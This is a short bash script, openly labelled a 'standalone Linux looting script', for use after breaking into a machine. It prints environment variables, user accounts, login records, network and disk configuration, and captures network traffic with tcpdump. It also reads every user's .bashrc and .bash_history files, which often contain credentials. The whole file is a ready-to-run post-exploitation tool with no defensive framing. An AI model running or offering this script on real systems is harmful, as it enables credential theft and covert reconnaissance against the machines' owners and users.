#!/bin/bash

#
#	forgetmenot_lin.sh
#	standalone linux looting script
#
#	Eric Valenzuela, eevn.io
#	05/02/2018
#

echo 'This script does not save on its own. To save, pipe the output to a file.'

uname -a
printenv

getent passwd
w
last

cat /etc/sysconfig/network
cat /etc/resolv.conf
find /etc/sysconfig/network-scripts/ -type f -exec cat {} +

ifconfig
arp -v

timeout 60 tcpdump

tcpdump &
sleep 60s && pkill -HUP -f tcpdump

df
lsblk
blkid
cat /etc/fstab

shopt -s dotglob
for f in /home/*/* ; do
	if [[ $f =~ .*.bashrc ]] ; then echo $f; cat $f; fi
	if [[ $f =~ .*.bash_history ]] ; then echo $f; cat $f; fi
done
